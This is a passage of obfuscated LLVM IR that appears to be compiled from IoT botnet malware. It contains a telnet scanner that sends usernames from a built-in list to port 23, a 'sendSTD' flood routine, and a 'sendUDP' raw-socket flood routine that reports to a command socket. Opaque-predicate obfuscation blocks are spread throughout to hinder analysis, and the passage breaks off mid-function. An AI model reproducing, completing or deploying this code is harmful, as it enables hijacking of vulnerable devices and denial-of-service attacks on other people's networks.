  store i16 2, i16* %1409, align 4
  %1410 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %1410, i16* %1411, align 2
  %1412 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %1413 = getelementptr inbounds [8 x i8], [8 x i8]* %1412, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1413, i8 0, i64 8, i32 4, i1 false)
  %1414 = load i32, i32* %13, align 4
  %1415 = sext i32 %1414 to i64
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1415
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1416, i32 0, i32 1
  %1418 = load i32, i32* %1417, align 4
  %1419 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  %1420 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1419, i32 0, i32 0
  store i32 %1418, i32* %1420, align 4
  %1421 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %1422 = load i32, i32* %13, align 4
  %1423 = sext i32 %1422 to i64
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1423
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1424, i32 0, i32 0
  store i32 %1421, i32* %1425, align 16
  %1426 = load i32, i32* %13, align 4
  %1427 = sext i32 %1426 to i64
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1427
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1428, i32 0, i32 0
  %1430 = load i32, i32* %1429, align 16
  %1431 = icmp eq i32 %1430, -1
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %398
  %1432 = call i32* @__errno_location() #13
  %1433 = load i32, i32* %1432, align 4
  %1434 = icmp ne i32 %1433, 115
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %418
  %1435 = load i32, i32* %13, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1436
  call void @reset_telstate(%struct.telstate_t* %1437)
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %444
  %1438 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %20, i32 0, i32 0
  %1439 = getelementptr inbounds [16 x i64], [16 x i64]* %1438, i64 0, i64 0
  %1440 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1439) #2, !srcloc !6
  %1441 = extractvalue { i64, i64* } %1440, 0
  %1442 = extractvalue { i64, i64* } %1440, 1
  %1443 = trunc i64 %1441 to i32
  store i32 %1443, i32* %29, align 4
  %1444 = ptrtoint i64* %1442 to i64
  %1445 = trunc i64 %1444 to i32
  store i32 %1445, i32* %30, align 4
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %534
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %554
  %1446 = load i32, i32* %13, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1447
  call void @reset_telstate(%struct.telstate_t* %1448)
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %584
  %1449 = load i32, i32* %13, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1450
  call void @reset_telstate(%struct.telstate_t* %1451)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %604
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %647
  %1452 = load i32, i32* %13, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1453
  call void @advance_state(%struct.telstate_t* %1454, i32 3)
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %681
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %698
  %1455 = load i32, i32* %13, align 4
  %1456 = sext i32 %1455 to i64
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1456
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1457, i32 0, i32 0
  %1459 = load i32, i32* %1458, align 16
  %1460 = load i32, i32* %13, align 4
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1461
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1462, i32 0, i32 4
  %1464 = load i8, i8* %1463, align 2
  %1465 = zext i8 %1464 to i64
  %1466 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %1465
  %1467 = load i8*, i8** %1466, align 8
  %1468 = load i32, i32* %13, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 4
  %1472 = load i8, i8* %1471, align 2
  %1473 = zext i8 %1472 to i64
  %1474 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %1473
  %1475 = load i8*, i8** %1474, align 8
  %1476 = call i64 @strlen(i8* %1475) #10
  %1477 = call i64 @send(i32 %1459, i8* %1467, i64 %1476, i32 16384)
  %1478 = icmp slt i64 %1477, 0
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %743
  %1479 = load i32, i32* %13, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1480
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1481, i32 0, i32 0
  %1483 = load i32, i32* %1482, align 16
  %1484 = call i64 @send(i32 %1483, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %1485 = icmp slt i64 %1484, 0
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %789
  %1486 = load i32, i32* %13, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 9
  %1490 = load i8*, i8** %1489, align 8
  %1491 = call i32 @contains_fail(i8* %1490)
  %1492 = icmp ne i32 %1491, 0
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %821
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %838
  %1493 = load i32, i32* %13, align 4
  %1494 = sext i32 %1493 to i64
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1494
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1495, i32 0, i32 7
  %1497 = load i32, i32* %1496, align 16
  %_125 = sub i32 0, %1497
  %gen126 = add i32 %_125, 3
  %_127 = shl i32 %1497, 3
  %_128 = shl i32 %1497, 3
  %_129 = shl i32 %1497, 3
  %_130 = sub i32 0, %1497
  %gen131 = add i32 %_130, 3
  %_132 = shl i32 %1497, 3
  %_133 = sub i32 0, %1497
  %gen134 = add i32 %_133, 3
  %1498 = add i32 %1497, 3
  %1499 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1500 = icmp ult i32 %1498, %1499
  br label %originalBB124

originalBB138alteredBB:                           ; preds = %originalBB138, %909
  %1501 = load i32, i32* %13, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1502
  call void @advance_state(%struct.telstate_t* %1503, i32 6)
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %968
  %1504 = load i32, i32* %13, align 4
  %1505 = sext i32 %1504 to i64
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1505
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1506, i32 0, i32 3
  %1508 = load i8, i8* %1507, align 1
  %1509 = zext i8 %1508 to i32
  %1510 = icmp eq i32 %1509, 2
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1027
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1044
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1061
  %1511 = load i32, i32* %13, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 7
  %1515 = load i32, i32* %1514, align 16
  %_155 = shl i32 %1515, 7
  %_156 = sub i32 %1515, 7
  %gen157 = mul i32 %_156, 7
  %_158 = sub i32 0, %1515
  %gen159 = add i32 %_158, 7
  %1516 = add i32 %1515, 7
  %1517 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1518 = icmp ult i32 %1516, %1517
  br label %originalBB154

originalBB163alteredBB:                           ; preds = %originalBB163, %1086
  %1519 = load i32, i32* %13, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1520
  call void @reset_telstate(%struct.telstate_t* %1521)
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %1106
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %1137
  %1522 = load i32, i32* %13, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 0
  %1526 = load i32, i32* %1525, align 16
  %1527 = call i64 @send(i32 %1526, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.140, i32 0, i32 0), i64 7, i32 16384)
  %1528 = icmp slt i64 %1527, 0
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %1161
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1277
  %1529 = load i32, i32* %13, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %1530
  call void @reset_telstate(%struct.telstate_t* %1531)
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1298
  br label %originalBB183
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %82, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %82

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 65, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = icmp sge i64 %56, %60
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %48
  %66 = load i32, i32* @x.85
  %67 = load i32, i32* @y.86
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %65
  store i32 0, i32* %11, align 4
  %74 = load i32, i32* @x.85
  %75 = load i32, i32* @y.86
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %82

; <label>:82:                                     ; preds = %originalBBpart2, %39
  %83 = load i32, i32* %11, align 4
  %84 = add i32 %83, 1
  store i32 %84, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  %86 = load i32, i32* @x.85
  %87 = load i32, i32* @y.86
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %85
  %94 = load i32, i32* @x.85
  %95 = load i32, i32* @y.86
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %65
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %85
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = load i32, i32* @x.87
  %10 = load i32, i32* @y.88
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  store i8* %0, i8** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 %7, i32* %24, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %18, align 4
  %44 = icmp eq i32 %43, 0
  %45 = load i32, i32* @x.87
  %46 = load i32, i32* @y.88
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %44, label %53, label %73

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* @x.87
  %55 = load i32, i32* @y.88
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = call i32 @rand_cmwc()
  %63 = trunc i32 %62 to i16
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %63, i16* %64, align 2
  %65 = load i32, i32* @x.87
  %66 = load i32, i32* @y.88
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %78

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = load i32, i32* %18, align 4
  %75 = trunc i32 %74 to i16
  %76 = call zeroext i16 @htons(i16 zeroext %75) #13
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %76, i16* %77, align 2
  br label %78

; <label>:78:                                     ; preds = %73, %originalBBpart24
  %79 = load i32, i32* @x.87
  %80 = load i32, i32* @y.88
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i8*, i8** %17, align 8
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %89 = call i32 @getHost(i8* %87, %struct.in_addr* %88)
  %90 = icmp ne i32 %89, 0
  %91 = load i32, i32* @x.87
  %92 = load i32, i32* @y.88
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %90, label %99, label %116

; <label>:99:                                     ; preds = %originalBBpart28
  %100 = load i32, i32* @x.87
  %101 = load i32, i32* @y.88
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = load i32, i32* @x.87
  %109 = load i32, i32* @y.88
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %503

; <label>:116:                                    ; preds = %originalBBpart28
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 3
  %118 = getelementptr inbounds [8 x i8], [8 x i8]* %117, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %118, i8 0, i64 8, i32 4, i1 false)
  %119 = load i32, i32* %22, align 4
  store i32 %119, i32* %26, align 4
  %120 = load i32, i32* %20, align 4
  %121 = icmp eq i32 %120, 32
  br i1 %121, label %122, label %232

; <label>:122:                                    ; preds = %116
  %123 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %123, i32* %27, align 4
  %124 = load i32, i32* %27, align 4
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %129, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  br label %503

; <label>:129:                                    ; preds = %122
  %130 = load i32, i32* %21, align 4
  %131 = add nsw i32 %130, 1
  %132 = sext i32 %131 to i64
  %133 = call noalias i8* @malloc(i64 %132) #2
  store i8* %133, i8** %28, align 8
  %134 = load i8*, i8** %28, align 8
  %135 = icmp eq i8* %134, null
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %129
  br label %503

; <label>:137:                                    ; preds = %129
  %138 = load i8*, i8** %28, align 8
  %139 = load i32, i32* %21, align 4
  %140 = add nsw i32 %139, 1
  %141 = sext i32 %140 to i64
  call void @llvm.memset.p0i8.i64(i8* %138, i8 0, i64 %141, i32 1, i1 false)
  %142 = load i8*, i8** %28, align 8
  %143 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %142, i32 %143)
  %144 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %145 = load i32, i32* %19, align 4
  %146 = add nsw i32 %144, %145
  store i32 %146, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %147

; <label>:147:                                    ; preds = %originalBBpart240, %208, %185, %137
  %148 = load i32, i32* @x.87
  %149 = load i32, i32* @y.88
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %147
  %156 = load i32, i32* %27, align 4
  %157 = load i8*, i8** %28, align 8
  %158 = load i32, i32* %21, align 4
  %159 = sext i32 %158 to i64
  %160 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %161 = call i64 @sendto(i32 %156, i8* %157, i64 %159, i32 0, %struct.sockaddr* %160, i32 16)
  %162 = load i32, i32* %30, align 4
  %163 = load i32, i32* %26, align 4
  %164 = icmp eq i32 %162, %163
  %165 = load i32, i32* @x.87
  %166 = load i32, i32* @y.88
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %164, label %173, label %186

; <label>:173:                                    ; preds = %originalBBpart216
  %174 = load i32, i32* %18, align 4
  %175 = icmp eq i32 %174, 0
  br i1 %175, label %176, label %180

; <label>:176:                                    ; preds = %173
  %177 = call i32 @rand_cmwc()
  %178 = trunc i32 %177 to i16
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %178, i16* %179, align 2
  br label %180

; <label>:180:                                    ; preds = %176, %173
  %181 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %182 = load i32, i32* %29, align 4
  %183 = icmp sgt i32 %181, %182
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %180
  br label %231

; <label>:185:                                    ; preds = %180
  store i32 0, i32* %30, align 4
  br label %147

; <label>:186:                                    ; preds = %originalBBpart216
  %187 = load i32, i32* @x.87
  %188 = load i32, i32* @y.88
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %186
  %195 = load i32, i32* %30, align 4
  %196 = add i32 %195, 1
  store i32 %196, i32* %30, align 4
  %197 = load i32, i32* %31, align 4
  %198 = load i32, i32* %23, align 4
  %199 = icmp eq i32 %197, %198
  %200 = load i32, i32* @x.87
  %201 = load i32, i32* @y.88
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br i1 %199, label %208, label %212

; <label>:208:                                    ; preds = %originalBBpart227
  %209 = load i32, i32* %24, align 4
  %210 = mul nsw i32 %209, 1000
  %211 = call i32 @usleep(i32 %210)
  store i32 0, i32* %31, align 4
  br label %147

; <label>:212:                                    ; preds = %originalBBpart227
  %213 = load i32, i32* @x.87
  %214 = load i32, i32* @y.88
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %212
  %221 = load i32, i32* %31, align 4
  %222 = add i32 %221, 1
  store i32 %222, i32* %31, align 4
  %223 = load i32, i32* @x.87
  %224 = load i32, i32* @y.88
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart240, label %originalBB29alteredBB

originalBBpart240:                                ; preds = %originalBB29
  br label %147

; <label>:231:                                    ; preds = %184
  br label %503

; <label>:232:                                    ; preds = %116
  %233 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %233, i32* %32, align 4
  %234 = load i32, i32* %32, align 4
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %239, label %236

; <label>:236:                                    ; preds = %232
  %237 = load i32, i32* @mainCommSock, align 4
  %238 = call i32 (i32, i8*, ...) @sockprintf(i32 %237, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  br label %503

; <label>:239:                                    ; preds = %232
  store i32 1, i32* %33, align 4
  %240 = load i32, i32* %32, align 4
  %241 = bitcast i32* %33 to i8*
  %242 = call i32 @setsockopt(i32 %240, i32 0, i32 3, i8* %241, i32 4) #2
  %243 = icmp slt i32 %242, 0
  br i1 %243, label %244, label %263

; <label>:244:                                    ; preds = %239
  %245 = load i32, i32* @x.87
  %246 = load i32, i32* @y.88
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
